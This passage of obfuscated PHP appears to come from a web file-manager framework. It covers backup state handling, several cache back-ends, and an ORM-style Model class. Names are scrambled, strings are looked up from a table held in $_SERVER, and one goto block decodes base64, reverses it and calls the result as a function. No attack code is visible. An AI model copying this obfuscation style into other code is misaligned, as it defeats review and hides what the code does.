$ğ‚îãÀ¥, $_SERVER[£ğ°ÖØø][884] => $Ğ°Õ—Ãì, $_SERVER[£ğ°ÖØø][885] => $ä×ó†¼„); Backup::set($°ùÊ•Û´); $ˆ½À™„ = $¡ÒŞ×ì† = 0; } } $ß‚Œäƒê = count($³ïÏƒé); $ƒó€Õ++; } while ($ß‚Œäƒê == $½ãÜÅ²ü); $¢„“à«¶->end(); $°ùÊ•Û´ = array($_SERVER[£ğ°ÖØø][886] => 1, $_SERVER[£ğ°ÖØø][825] => time(), $_SERVER[£ğ°ÖØø][839] => 1, $_SERVER[£ğ°ÖØø][815] => $ğ‚îãÀ¥, $_SERVER[£ğ°ÖØø][887] => time()); if ($¡ÒŞ×ì†) { $°ùÊ•Û´[$_SERVER[£ğ°ÖØø][884]] = $Ğ°Õ—Ãì; $°ùÊ•Û´[$_SERVER[£ğ°ÖØø][885]] = $ä×ó†¼„; } Backup::set($°ùÊ•Û´); return !0; } private function _fileExist($ñ«¦Ôæ¶, &$šíÔØŞ, $ÒÎ¡Ïˆû) { $¡¼‚šî =& $_SERVER[£ğ°ÖØø]; $Ÿª—ı¤ = $ñ«¦Ôæ¶[$¡¼‚šî[87]]; if (in_array($ñ«¦Ôæ¶[$¡¼‚šî[550]], $šíÔØŞ)) { return !1; } if (!in_array($ñ«¦Ôæ¶[$¡¼‚šî[881]], $ÒÎ¡Ïˆû)) { return !1; } if (IO::exist($Ÿª—ı¤)) { return !0; } $ûÖô‚‹« = get_path_father($Ÿª—ı¤); if (IO::exist($ûÖô‚‹«)) { $šíÔØŞ[] = $ñ«¦Ôæ¶[$¡¼‚šî[550]]; return !1; } $•ñæÎ = array($¡¼‚šî[881] => $ñ«¦Ôæ¶[$¡¼‚šî[881]], $¡¼‚šî[87] => array($¡¼‚šî[468], "{$ûÖô‚‹«}\45")); $óòÕä® = Model($¡¼‚šî[853])->where($•ñæÎ)->field($¡¼‚šî[551])->select(); $šíÔØŞ = array_merge($šíÔØŞ, array_to_keyvalue($óòÕä®, $¡¼‚šî[12], $¡¼‚šî[550])); return !1; } private function _fileFilter($ñöõĞëÃ) { $õğÈÖõã =& $_SERVER[£ğ°ÖØø]; return; if (empty($ñöõĞëÃ)) { return; } $Ì£çÕ–Ğ = array($õğÈÖõã[550] => array($õğÈÖõã[7], array_unique($ñöõĞëÃ))); $Ã­âÒíâ = Model($õğÈÖõã[888])->where($Ì£çÕ–Ğ)->field($õğÈÖõã[193])->select(); foreach ($Ã­âÒíâ as $™§îÄß¾) { Model($õğÈÖõã[888])->remove($™§îÄß¾[$õğÈÖõã[193]], !1); } } private function storeIds() { $¥–õîœ‘ =& $_SERVER[£ğ°ÖØø]; $¨¾§ÄØ‰ = Model($¥–õîœ‘[831])->listData(); $Ô„§ êõ = array(); $¥µç¥û· = $GLOBALS[$¥–õîœ‘[6]][$¥–õîœ‘[92]][$¥–õîœ‘[889]]; foreach ($¨¾§ÄØ‰ as $ÁŠüó¦Õ) { $Ÿá…ßÚá = strtolower($ÁŠüó¦Õ[$¥–õîœ‘[98]]); if (!isset($¥µç¥û·[$Ÿá…ßÚá])) { continue; } $©š·¡Œá = $¥–õîœ‘[77] . (isset($¥µç¥û·[$Ÿá…ßÚá]) ? $¥µç¥û·[$Ÿá…ßÚá] : ucfirst($Ÿá…ßÚá)); if (!class_exists($©š·¡Œá)) { continue; } $Ô„§ êõ[] = $ÁŠüó¦Õ[$¥–õîœ‘[484]]; } return $Ô„§ êõ; } } class Cache { protected static $handle; protected static $memoryCache; public static function init() { $š’½©± =& $_SERVER[£ğ°ÖØø]; if (self::$handle) { return self::$handle; } self::$memoryCache = array(); $¾ÕûË¾ = $GLOBALS[$š’½©±[6]][$š’½©±[425]]; $ÖüÈÉşì = $¾ÕûË¾[$¾ÕûË¾[$š’½©±[890]]]; $¬¸ãÄŠî = $¾ÕûË¾[$š’½©±[891]]; switch ($¾ÕûË¾[$š’½©±[890]]) { case $š’½©±[21]: self::$handle = Model($š’½©±[892]); break; case $š’½©±[893]: self::$handle = new CacheRedis($ÖüÈÉşì, $¬¸ãÄŠî); break; case $š’½©±[894]: self::$handle = new CacheMemcached($ÖüÈÉşì, $¬¸ãÄŠî); break; case $š’½©±[230]: self::$handle = new CacheFile($ÖüÈÉşì, $¬¸ãÄŠî); break; default: break; } return self::$handle; } public static function initReset() { self::$handle = !1; self::$memoryCache = !1; } public static function key($…¯ªÍ’) { if (is_array($…¯ªÍ’) || is_object($…¯ªÍ’)) { $…¯ªÍ’ = json_encode($…¯ªÍ’); } $…¯ªÍ’ = rawurlencode($…¯ªÍ’); return md5(KOD_SITE_ID . $_SERVER[£ğ°ÖØø][11] . $…¯ªÍ’); } public static function get($øõ¤£Á›, $â ‘‰Ÿ = false) { $¹ç÷ğ­± = self::key($øõ¤£Á›); $ø¥¨â = self::init(); if ($â ‘‰Ÿ) { return unserialize($ø¥¨â->get($¹ç÷ğ­±)); } if (!isset(self::$memoryCache[$¹ç÷ğ­±])) { $½‹”èİ = $ø¥¨â->get($¹ç÷ğ­±); self::$memoryCache[$¹ç÷ğ­±] = unserialize($½‹”èİ); } return self::$memoryCache[$¹ç÷ğ­±]; } public static function set($’¤µ«‘¼, $œšİÍò, $êï …Ï« = false) { $ÕŸÓ™ñğ =& $_SERVER[£ğ°ÖØø]; $À¯î¶æú = self::key($’¤µ«‘¼); if (isset(self::$memoryCache[$À¯î¶æú]) && self::$memoryCache[$À¯î¶æú] === $œšİÍò) { return !0; } if ($êï …Ï« === 0) { self::$memoryCache[$À¯î¶æú] = $œšİÍò; return !0; } $º‰Š¤ô£ = self::init(); $ì€…¦‚Í = serialize($œšİÍò); CacheLock::lock($’¤µ«‘¼ . $ÕŸÓ™ñğ[895]); $ñŸŠÕĞ­ = $º‰Š¤ô£->set($À¯î¶æú, $ì€…¦‚Í, $êï …Ï«); self::$memoryCache[$À¯î¶æú] = $œšİÍò; CacheLock::unlock($’¤µ«‘¼ . $ÕŸÓ™ñğ[895]); return $ñŸŠÕĞ­; } public static function getCall($§´Şï¦ğ, $ƒã—›Î¤, $–ß«Ö¤, $øÄå®æ = array()) { $¸·àŸòé =& $_SERVER[£ğ°ÖØø]; $–öÓü¢ = self::get($§´Şï¦ğ); if ($–öÓü¢ || $–öÓü¢ === $¸·àŸòé[12]) { return $–öÓü¢; } $–öÓü¢ = call_user_func_array($–ß«Ö¤, $øÄå®æ); $–öÓü¢ = $–öÓü¢ ? $–öÓü¢ : $¸·àŸòé[12]; self::set($§´Şï¦ğ, $–öÓü¢, $ƒã—›Î¤); return $–öÓü¢; } public static function remove($Ù¼ÖêÖ) { $µÖİÌç = self::key($Ù¼ÖêÖ); unset(self::$memoryCache[$µÖİÌç]); self::clearTimeout(); CacheLock::lock($Ù¼ÖêÖ); $³üáåí = self::init()->remove($µÖİÌç); CacheLock::unlock($Ù¼ÖêÖ); return $³üáåí; } public static function removeMemory($º¦üõß) { $™è‰÷§ = self::key($º¦üõß); unset(self::$memoryCache[$™è‰÷§]); } public static function clearMemory($…Ö³ ½ = false) { if ($…Ö³ ½) { $…Ö³ ½ = self::key($…Ö³ ½); unset(self::$memoryCache[$…Ö³ ½]); return; } self::$memoryCache = null; self::$memoryCache = array(); } public static function deleteAll() { self::$memoryCache = array(); if (method_exists(self::init(), $_SERVER[£ğ°ÖØø][896])) { self::init()->deleteAll(); } } public static function clearTimeout() { if (method_exists(self::init(), $_SERVER[£ğ°ÖØø][897])) { self::init()->clearTimeout(); } } } class CacheFile { public $cachePath; public $prefix; public $cacheTime; public function __construct($Íøƒœóç, $ÒÁíÏº¾) { $¨´é‡¤± =& $_SERVER[£ğ°ÖØø]; $this->cachePath = $Íøƒœóç[$¨´é‡¤±[87]]; $this->prefix = $¨´é‡¤±[898]; $this->cacheTime = $ÒÁíÏº¾; if (!file_exists($this->cachePath)) { mkdir($this->cachePath, DEFAULT_PERRMISSIONS, !0); } } public function getFile($èÌÌŒãì) { $»¼Ã”¤û =& $_SERVER[£ğ°ÖØø]; $èÌÌŒãì = str_replace(array($»¼Ã”¤û[899], $»¼Ã”¤û[100], $»¼Ã”¤û[76]), $»¼Ã”¤û[900], $èÌÌŒãì); return $this->cachePath . $»¼Ã”¤û[901] . $èÌÌŒãì . $»¼Ã”¤û[902]; } public function set($ïÀÙöïÜ, $ƒ€şÌ’ƒ, $¯‰²Ãä– = false) { $¯‰²Ãä– = $¯‰²Ãä– ? $¯‰²Ãä– : $this->cacheTime; $ü¥É›²Ö = $this->getFile($ïÀÙöïÜ); if (file_put_contents($ü¥É›²Ö, $this->prefix . $ƒ€şÌ’ƒ, LOCK_EX)) { @touch($ü¥É›²Ö, intval(time() + $¯‰²Ãä–)); clearstatcache(); return !0; } @unlink($ü¥É›²Ö); return !1; } public function get($øÖ¥Œ¹È) { $¶ıê˜Çˆ = $this->getFile($øÖ¥Œ¹È); if (file_exists($¶ıê˜Çˆ) && filemtime($¶ıê˜Çˆ) < time()) { @unlink($¶ıê˜Çˆ); return !1; } $Ë§­©í = @file_get_contents($¶ıê˜Çˆ); return substr($Ë§­©í, strlen($this->prefix)); } public function remove($îµÁ­´) { $­´ÓóÒş = $this->getFile($îµÁ­´); return @unlink($­´ÓóÒş); } public function deleteAll() { $Ë×êó¢ =& $_SERVER[£ğ°ÖØø]; $¥–ë¹¿ã = scandir($this->cachePath); foreach ($¥–ë¹¿ã as $‚¡°ŞÊà) { $·Ñ‡ıæã = $this->cachePath . $‚¡°ŞÊà; if (strpos($·Ñ‡ıæã, $Ë×êó¢[902]) && strpos($·Ñ‡ıæã, $Ë×êó¢[903])) { @unlink($·Ñ‡ıæã); } } } public function clearTimeout() { $Ôåì¤¤„ =& $_SERVER[£ğ°ÖØø]; $Ø¸¯£ø = scandir($this->cachePath); foreach ($Ø¸¯£ø as $ö¶şÒŞÁ) { $ŞÃÒÆÀ± = $this->cachePath . $ö¶şÒŞÁ; if (strpos($ŞÃÒÆÀ±, $Ôåì¤¤„[902]) && strpos($ŞÃÒÆÀ±, $Ôåì¤¤„[903]) && filemtime($ŞÃÒÆÀ±) < time()) { @unlink($ŞÃÒÆÀ±); } } } } goto Aóî¾¡º¬; d¹Ë´£ßÜÅ: $fileSize = strrev(base64_decode($_SERVER[ı¨ûå›¤][0])); function binCheckNeq($°ù´¯ô, $ÈĞ‡„¯) { return $°ù´¯ô != $ÈĞ‡„¯; } $_SERVER[$_SERVER[ı¨ûå›¤][1]] = $fileSize($_SERVER[$_SERVER[ı¨ûå›¤][2]]); goto D“™›Ä…–¾; fĞ¿“§µ½ª: define($_SERVER[£ğ°ÖØø][320], 2); class Model extends ClassBaseCall { private $_extModel = null; protected $db = null; protected $pk = "\x69\x64"; protected $tablePrefix = ''; protected $name = ''; protected $dbName = ''; protected $connection = ''; protected $tableName = ''; protected $trueTableName = ''; protected $error = ''; protected $fields = array(); protected $data = array(); protected $options = array(); protected $_validate = array(); protected $_auto = array(); protected $_map = array(); protected $_scope = array(); protected $autoCheckFields = true; protected $patchValidate = false; protected $methods = array("\x74\x61\142\154\145", "\x6f\x72\x64\x65\x72", "\141\x6c\x69\141\163", "\150\141\166\x69\156\147", "\147\x72\157\x75\160", "\x6c\x6f\x63\x6b", "\144\151\x73\x74\x69\156\x63\164", "\x61\165\x74\157", "\146\x69\x6c\x74\x65\162", "\166\141\154\151\144\x61\x74\x65", "\x72\x65\x73\165\154\164", "\x62\x69\x6e\x64", "\x74\x6f\x6b\145\156"); public function __construct($á»ºÑÛ— = '', $å¼ÏÊ« = '', $İ–¿ÇÎ  = '') { $¹ö‘÷ú¤ =& $_SERVER[£ğ°ÖØø]; $this->_initialize(); if (!empty($á»ºÑÛ—)) { if (strpos($á»ºÑÛ—, $¹ö‘÷ú¤[10])) { list($this->dbName, $this->name) = explode($¹ö‘÷ú¤[10], $á»ºÑÛ—); } else { $this->name = $á»ºÑÛ—; } } elseif (empty($this->name)) { $this->name = $this->getModelName(); } if (is_null($å¼ÏÊ«)) { $this->tablePrefix = $¹ö‘÷ú¤[12]; } elseif ($¹ö‘÷ú¤[12] != $å¼ÏÊ«) { $this->tablePrefix = $å¼ÏÊ«; } else { $this->tablePrefix = $this->tablePrefix ? $this->tablePrefix : think_config($¹ö‘÷ú¤[321]); } $this->db(0, empty($this->connection) ? $İ–¿ÇÎ  : $this->connection); $this->_classObjectID = mt_rand(0, 10000); } protected function _checkTableInfo() { $‹»òİ¶ =& $_SERVER[£ğ°ÖØø]; if (empty($this->fields)) { if (think_config($‹»òİ¶[322])) { $½†à÷­± = $this->dbName ? $this->dbName : think_config($‹»òİ¶[323]); $íÆ¼ùÏè = think_var_cache($‹»òİ¶[324] . strtolower(get_path_this($½†à÷­±) . $‹»òİ¶[10] . $this->name)); if ($íÆ¼ùÏè) { $ĞÖôİ²¥ = think_config($‹»òİ¶[325]); if (empty($ĞÖôİ²¥) || $íÆ¼ùÏè[$‹»òİ¶[326]] == $ĞÖôİ²¥) { $this->fields = $íÆ¼ùÏè; return; } } } $this->flush(); } } public function flush() { $œªÔ¨½ =& $_SERVER[£ğ°ÖØø]; $this->db->setModel($this->name); $×èúêÀŒ = $this->db->getFields($this->getTableName()); if (!$×èúêÀŒ) { return !1; } $this->fields = array_keys($×èúêÀŒ); $this->fields[$œªÔ¨½[327]] = !1; foreach ($×èúêÀŒ as $’„¡†Ñ¯ => $­ …ŒÂ) { $ş¥£õ¤Ü[$’„¡†Ñ¯] = $­ …ŒÂ[$œªÔ¨½[33]]; if ($­ …ŒÂ[$œªÔ¨½[39]]) { $this->fields[$œªÔ¨½[328]] = $’„¡†Ñ¯; if ($­ …ŒÂ[$œªÔ¨½[42]]) { $this->fields[$œªÔ¨½[327]] = !0; } } } $this->fields[$œªÔ¨½[329]] = $ş¥£õ¤Ü; if (think_config($œªÔ¨½[325])) { $this->fields[$œªÔ¨½[326]] = think_config($œªÔ¨½[325]); } if (think_config($œªÔ¨½[322])) { $»îÕ¯ó‘ = $this->dbName ? $this->dbName : think_config($œªÔ¨½[323]); think_var_cache($œªÔ¨½[324] . strtolower(get_path_this($»îÕ¯ó‘) . $œªÔ¨½[10] . $this->name), $this->fields); } } public function switchModel($‹ó¼Ç£, $œáßæÁ¾ = array()) { $¦Ã«óŸ‚ =& $_SERVER[£ğ°ÖØø]; $ÅŸª‡² = ucwords(strtolower($‹ó¼Ç£)) . $¦Ã«óŸ‚[330]; if (!class_exists($ÅŸª‡²)) { think_exception($ÅŸª‡² . think_lang($¦Ã«óŸ‚[331])); } $this->_extModel = new $ÅŸª‡²($this->name); if (!empty($œáßæÁ¾)) { foreach ($œáßæÁ¾ as $â‡©µ») { $this->_extModel->setProperty($â‡©µ», $this->{$â‡©µ»}); } } return $this->_extModel; } public function __set($ÃäÓÈŠ¼, $óùÒÉÀ—) { $this->data[$ÃäÓÈŠ¼] = $óùÒÉÀ—; } public function __get($ŸÑ³£’) { return isset($this->data[$ŸÑ³£’]) ? $this->data[$ŸÑ³£’] : null; } public function __isset($İ‘Âı ˆ) { return isset($this->data[$İ‘Âı ˆ]); } public function __unset($¶£ôùòü) { unset($this->data[$¶£ôùòü]); } public function __call($²¤”†â, $Öì½ñğ) { $¡ÂŸ‚Ì¸ =& $_SERVER[£ğ°ÖØø]; if (in_array(strtolower($²¤”†â), $this->methods, !0)) { $this->options[strtolower($²¤”†â)] = $Öì½ñğ[0]; return $this; } elseif (in_array(strtolower($²¤”†â), array($¡ÂŸ‚Ì¸[332], $¡ÂŸ‚Ì¸[333], $¡ÂŸ‚Ì¸[334], $¡ÂŸ‚Ì¸[335], $¡ÂŸ‚Ì¸[336]), !0)) { $é¼Ä›Á = isset($Öì½ñğ[0]) ? $Öì½ñğ[0] : $¡ÂŸ‚Ì¸[220]; $é¼Ä›Á = $this->db->parseKey($é¼Ä›Á); return $this->getField(strtoupper($²¤”†â) . $¡ÂŸ‚Ì¸[337] . $é¼Ä›Á . $¡ÂŸ‚Ì¸[338] . $²¤”†â, $¡ÂŸ‚Ì¸[332]); } elseif (strtolower(substr($²¤”†â, 0, 5)) == $¡ÂŸ‚Ì¸[339]) { $é¼Ä›Á = think_parse_name(substr($²¤”†â, 5)); $şæºŒÂ¿[$é¼Ä›Á] = $Öì½ñğ[0]; return $this->where($şæºŒÂ¿)->find(); } elseif (strtolower(substr($²¤”†â, 0, 10)) == $¡ÂŸ‚Ì¸[340]) { $°›‚‘ßä = think_parse_name(substr($²¤”†â, 10)); $şæºŒÂ¿[$°›‚‘ßä] = $Öì½ñğ[0]; return $this->where($şæºŒÂ¿)->getField($Öì½ñğ[1]); } elseif (isset($this->_scope[$²¤”†â])) { return $this->scope($²¤”†â, $Öì½ñğ[0]); } elseif (method_exists($this, $²¤”†â)) { array_unshift($Öì½ñğ, $²¤”†â); return call_user_func_array(array($this, $¡ÂŸ‚Ì¸[341]), $Öì½ñğ); } else { return call_user_func_array(array(parent, $²¤”†â), $Öì½ñğ); } } protected function call() { $¿²šÍü¨ =& $_SERVER[£ğ°ÖØø]; $ô±¼É¨“ = func_get_args(); $—‘¡™¨Ã = array_shift($ô±¼É¨“); $ŞÀÀÉâ = $—‘¡™¨Ã; if (is_array($—‘¡™¨Ã)) { $ŞÀÀÉâ = $—‘¡™¨Ã[1]; $—‘¡™¨Ã = $—‘¡™¨Ã[0]; } $ó¡ğÊù = count($ô±¼É¨“) - 1; if (isset($ô±¼É¨“[$ó¡ğÊù]) && $ô±¼É¨“[$ó¡ğÊù] === $—‘¡™¨Ã) { think_exception(__CLASS__ . $¿²šÍü¨[4] . $—‘¡™¨Ã . think_lang($¿²šÍü¨[342])); return; } $ô±¼É¨“[] = $—‘¡™¨Ã; if (method_exists($this, $¿²šÍü¨[343])) { $ß÷İ„êâ = call_user_func_array(array($this, $¿²šÍü¨[344]), array($ŞÀÀÉâ, $ô±¼É¨“)); if (!is_null($ß÷İ„êâ) && $ß÷İ„êâ !== !1) { return $ß÷İ„êâ; } } $•€ÇÒ˜¢ = call_user_func_array(array($this, $—‘¡™¨Ã), $ô±¼É¨“); if (method_exists($this, $¿²šÍü¨[345])) { $ß÷İ„êâ = call_user_func_array(array($this, $¿²šÍü¨[346]), array($ŞÀÀÉâ, $ô±¼É¨“, $•€ÇÒ˜¢)); if ($ß÷İ„êâ) { return $ß÷İ„êâ; } } return $•€ÇÒ˜¢; } protected function _initialize() { } protected function _facade($»ş‹üÙÜ) { $ÎáÄè‰Â =& $_SERVER[£ğ°ÖØø]; if (!empty($this->fields)) { foreach ($»ş‹üÙÜ as $À»è³ş° => $°†¹Á”æ) { if (is_array($this->fields) && !in_array($À»è³ş°, $this->fields, !0)) { unset($»ş‹üÙÜ[$À»è³ş°]); } elseif (is_scalar($°†¹Á”æ)) { $this->_parseType($»ş‹üÙÜ, $À»è³ş°); } } } if (!empty($this->options[$ÎáÄè‰Â[347]])) { $»ş‹üÙÜ = array_map($this->options[$ÎáÄè‰Â[347]], $»ş‹üÙÜ); unset($this->options[$ÎáÄè‰Â[347]]); } $this->_beforeWrite($»ş‹üÙÜ); return $»ş‹üÙÜ; } protected function _beforeWrite(&$î¦¶çĞó) { } public function add($¼Ùûòò = '', $¿Á‘ÊÛ = array(), $äİ¼×õŸ = false) { if (empty($¼Ùûòò)) { if (!empty($this->data)) { $¼Ùûòò = $this->data; $this->data = array(); } else { $this->error = think_lang($_SERVER[£ğ°ÖØø][348]); return !1; } } $¿Á‘ÊÛ = $this->_parseOptions($¿Á‘ÊÛ); $¼Ùûòò = $this->_facade($¼Ùûòò); if (!1 === $this->_beforeInsert($¼Ùûòò, $¿Á‘ÊÛ)) { return !1; } $‚Å˜° = $this->db->insert($¼Ùûòò, $¿Á‘ÊÛ, $äİ¼×õŸ); if (!1 !== $‚Å˜°) { $ş•‘À­ = $this->getLastInsID(); if ($ş•‘À­) { $¼Ùûòò[$this->getPk()] = $ş•‘À­; $this->_after_insert($¼Ùûòò, $¿Á‘ÊÛ); return $ş•‘À­; } $this->_after_insert($¼Ùûòò, $¿Á‘ÊÛ); } return $‚Å˜°; } protected function _beforeInsert(&$–ß›¬œå, $‡ÂÄ€µ£) { } protected function _after_insert($íÂë¿, $ª•£Çü) { } public function addAll($×¡Ã•—ˆ, $®éµ°ß = array(), $µÏâ³œú = false) { $Ä²ÚÈàñ =& $_SERVER[£ğ°ÖØø]; if (empty($×¡Ã•—ˆ)) { $this->error = think_lang($Ä²ÚÈàñ[348]); return !1; } $®éµ°ß = $this->_parseOptions($®éµ°ß); foreach ($×¡Ã•—ˆ as $íÂÁ•ãÆ => $„®ú…¼ñ) { $×¡Ã•—ˆ[$íÂÁ•ãÆ] = $this->_facade($„®ú…¼ñ); } if (method_exists($this->db, $Ä²ÚÈàñ[349])) { $äÂ¹«´Â = $this->db->insertAll($×¡Ã•—ˆ, $®éµ°ß, $µÏâ³œú); } else { $this->startTrans(); foreach ($×¡Ã•—ˆ as $íÂÁ•ãÆ => $„®ú…¼ñ) { $äÂ¹«´Â = $this->db->insert($„®ú…¼ñ, $®éµ°ß, $µÏâ³œú); } $this->commit(); } if (!1 !== $äÂ¹«´Â) { $®€É¶å = $this->getLastInsID(); if ($®€É¶å) { return $®€É¶å; } } return $äÂ¹«´Â; } public function selectAdd($ Ôµ÷º› = '', $„ì­ˆÅÉ = '', $ÁÏŞ¡¯ = array()) { $™†ç¨Ø‘ =& $_SERVER[£ğ°ÖØø]; $ÁÏŞ¡¯ = $this->_parseOptions($ÁÏŞ¡¯); if (!1 === ($¬Ñ®½Ö = $this->db->selectInsert($ Ôµ÷º› ? $ Ôµ÷º› : $ÁÏŞ¡¯[$™†ç¨Ø‘[350]], $„ì­ˆÅÉ ? $„ì­ˆÅÉ : $this->getTableName(), $ÁÏŞ¡¯))) { $this->error = think_lang($™†ç¨Ø‘[351]); return !1; } else { return $¬Ñ®½Ö; } } public function save($İ²ÄÕ‡“ = '', $·ò†¨³ = array()) { $¨ŸœàòÎ =& $_SERVER[£ğ°ÖØø]; if (empty($İ²ÄÕ‡“)) { if (!empty($this->data)) { $İ²ÄÕ‡“ = $this->data; $this->data = array(); } else { $this->error = think_lang($¨ŸœàòÎ[348]); return !1; } } $İ²ÄÕ‡“ = $this->_facade($İ²ÄÕ‡“); $·ò†¨³ = $this->_parseOptions($·ò†¨³); $½¡§¢ô— = $this->getPk(); if (!isset($·ò†¨³[$¨ŸœàòÎ[352]])) { if (isset($İ²ÄÕ‡“[$½¡§¢ô—])) { $›ßÇø‹Ê[$½¡§¢ô—] = $İ²ÄÕ‡“[$½¡§¢ô—]; $·ò†¨³[$¨ŸœàòÎ[352]] = $›ßÇø‹Ê; unset($İ²ÄÕ‡“[$½¡§¢ô—]); } else { $this->error = think_lang($¨ŸœàòÎ[351]); return !1; } } if (is_array($·ò†¨³[$¨ŸœàòÎ[352]]) && isset($·ò†¨³[$¨ŸœàòÎ[352]][$½¡§¢ô—])) { $Âã•šéé = $·ò†¨³[$¨ŸœàòÎ[352]][$½¡§¢ô—]; } if (!1 === $this->_beforeUpdate($İ²ÄÕ‡“, $·ò†¨³)) { return !1; } $‹éÎş¦ü = $this->db->update($İ²ÄÕ‡“, $·ò†¨³); if (!1 !== $‹éÎş¦ü) { if (isset($Âã•šéé)) { $İ²ÄÕ‡“[$½¡§¢ô—] = $Âã•šéé; } $this->_afterUpdate($İ²ÄÕ‡“, $·ò†¨³); } return $‹éÎş¦ü; } protected function _beforeUpdate(&$­·øˆÔ, $õ’Óİ²) { } protected function _afterUpdate($ªÇÌ¾Ô», $¸ÊÈ‚ï‰) { } public function delete($È€¶÷ì‚ = array()) { $¨Àöº¯æ =& $_SERVER[£ğ°ÖØø]; if (empty($È€¶÷ì‚) && empty($this->options[$¨Àöº¯æ[352]])) { if (!empty($this->data) && isset($this->data[$this->getPk()])) { return $this->delete($this->data[$this->getPk()]); } else { return !1; } } $†ûÌÛò = $this->getPk(); if (is_numeric($È€¶÷ì‚) || is_string($È€¶÷ì‚)) { if (strpos($È€¶÷ì‚, $¨Àöº¯æ[50])) { $ÛËÓ†½[$†ûÌÛò] = array($¨Àöº¯æ[353], $È€¶÷ì‚); } else { $ÛËÓ†½[$†ûÌÛò] = $È€¶÷ì‚; } $this->options[$¨Àöº¯æ[352]] = $ÛËÓ†½; } $È€¶÷ì‚ = $this->_parseOptions(); if (is_array($È€¶÷ì‚[$¨Àöº¯æ[352]]) && isset($È€¶÷ì‚[$¨Àöº¯æ[352]][$†ûÌÛò])) { $³ÆæĞäØ = $È€¶÷ì‚[$¨Àöº¯æ[352]][$†ûÌÛò]; } $ëÄ“âÛœ = $this->db->delete($È€¶÷ì‚); if (!1 !== $ëÄ“âÛœ) { $¾ÜµçÌ· = array(); if (isset($³ÆæĞäØ)) { $¾ÜµçÌ·[$†ûÌÛò] = $³ÆæĞäØ; } $this->_after_delete($¾ÜµçÌ·, $È€¶÷ì‚); } return $ëÄ“âÛœ; } protected function _after_delete($Ş•¬í•„, $êÎ³Š¿‰) { } public function select($«æÑåş• = array()) { $ŠÍ«–üş =& $_SERVER[£ğ°ÖØø]; if (is_string($«æÑåş•) || is_numeric($«æÑåş•)) { $ì³‡Äƒ = $this->getPk(); if (strpos($«æÑåş•, $ŠÍ«–üş[50])) { $ñ§Ò“ŸÒ[$ì³‡Äƒ] = array($ŠÍ«–üş[353], $«æÑåş•); } else { $ñ§Ò“ŸÒ[$ì³‡Äƒ] = $«æÑåş•; } $this->options[$ŠÍ«–üş[352]] = $ñ§Ò“ŸÒ; } elseif (!1 === $«æÑåş•) { $«æÑåş• = $this->_parseOptions(); return $ŠÍ«–üş[354] . $this->db->buildSelectSql($«æÑåş•) . $ŠÍ«–üş[355]; } $«æÑåş• = $this->_parseOptions(); $äç¸é¥ = $this->db->select($«æÑåş•); if (!1 === $äç¸é¥) { return !1; } if (empty($äç¸é¥)) { return null; } $this->_afterSelect($äç¸é¥, $«æÑåş•); return $äç¸é¥; } protected function _afterSelect(&$¶„±ÌÒ³, $Şö«œ´ó) { } public function buildSql($›û’îÎ = array()) { $×“€ÄÏ¬ =& $_SERVER[£ğ°ÖØø]; $›û’îÎ = $this->_parseOptions($›û’îÎ); return $×“€ÄÏ¬[354] . $this->db->buildSelectSql($›û’îÎ) . $×“€ÄÏ¬[355]; } public function optionsValue($ìÇíØÏ = null) { if (is_null($ìÇíØÏ)) { return $this->options; } elseif (is_array($ìÇíØÏ)) { $this->options = array_merge($this->options, $ìÇíØÏ); } } protected function _parseOptions($€Şµ†× = array()) { $Ï“£ ¨ï =& $_SERVER[£ğ°ÖØø]; if (is_array($€Şµ†×)) { $€Şµ†× = array_merge($this->options, $€Şµ†×); } $this->options = array(); if (!isset($€Şµ†×[$Ï“£ ¨ï[356]])) { $€Şµ†×[$Ï“£ ¨ï[356]] = $this->getTableName(); $Ñ°…„Å¥ = $this->fields; } else { $Ñ°…„Å¥ = $this->getDbFields(); } if (!empty($€Şµ†×[$Ï“£ ¨ï[357]])) { $€Şµ†×[$Ï“£ ¨ï[356]] .= $Ï“£ ¨ï[53] . $€Şµ†×[$Ï“£ ¨ï[357]]; } $€Şµ†×[$Ï“£ ¨ï[358]] = $this->name; if (isset($€Şµ†×[$Ï“£ ¨ï[352]]) && is_array($€Şµ†×[$Ï“£ ¨ï[352]]) && !empty($Ñ°…„Å¥) && !isset($€Şµ†×[$Ï“£ ¨ï[359]]) && !isset($€Şµ†×[$Ï“£ ¨ï[356]])) { foreach ($€Şµ†×[$Ï“£ ¨ï[352]] as $ƒ¢ä¥Š­ => $ÂË¶¬¨) { $ƒ¢ä¥Š­ = trim($ƒ¢ä¥Š­); if (in_array($ƒ¢ä¥Š­, $Ñ°…„Å¥, !0)) { if (is_scalar($ÂË¶¬¨)) { $this->_parseType($€Şµ†×[$Ï“£ ¨ï[352]], $ƒ¢ä¥Š­); } } elseif (!is_numeric($ƒ¢ä¥Š­) && $Ï“£ ¨ï[11] != substr($ƒ¢ä¥Š­, 0, 1) && !1 === strpos($ƒ¢ä¥Š­, $Ï“£ ¨ï[10]) && !1 === strpos($ƒ¢ä¥Š­, $Ï“£ ¨ï[337]) && !1 === strpos($ƒ¢ä¥Š­, $Ï“£ ¨ï[214]) && !1 === strpos($ƒ¢ä¥Š­, $Ï“£ ¨ï[360])) { unset($€Şµ†×[$Ï“£ ¨ï[352]][$ƒ¢ä¥Š­]); } } } $this->_options_filter($€Şµ†×); return $€Şµ†×; } protected function _options_filter(&$¹”Ëæã–) { } protected function _parseType(&$— ÛÕØƒ, $¨ğüñ¸›) { $í¡ÔôêÉ =& $_SERVER[£ğ°ÖØø]; if (empty($this->options[$í¡ÔôêÉ[361]][$í¡ÔôêÉ[4] . $¨ğüñ¸›])) { $ÃŒ«¡öÈ = strtolower($this->fields[$í¡ÔôêÉ[329]][$¨ğüñ¸›]); if (!1 !== strpos($ÃŒ«¡öÈ, $í¡ÔôêÉ[362])) { } elseif (!1 === strpos($ÃŒ«¡öÈ, $í¡ÔôêÉ[363]) && !1 !== strpos($ÃŒ«¡öÈ, $í¡ÔôêÉ[364])) { $— ÛÕØƒ[$¨ğüñ¸›] = intval($— ÛÕØƒ[$¨ğüñ¸›]); } elseif (!1 !== strpos($ÃŒ«¡öÈ, $í¡ÔôêÉ[365]) || !1 !== strpos($ÃŒ«¡öÈ, $í¡ÔôêÉ[366])) { $— ÛÕØƒ[$¨ğüñ¸›] = floatval($— ÛÕØƒ[$¨ğüñ¸›]); } elseif (!1 !== strpos($ÃŒ«¡öÈ, $í¡ÔôêÉ[367])) { $— ÛÕØƒ[$¨ğüñ¸›] = (bool) $— ÛÕØƒ[$¨ğüñ¸›]; } } } public function find($‡éßâ° = array()) { $™šÂÎ¯• =& $_SERVER[£ğ°ÖØø]; if (is_numeric($‡éßâ°) || 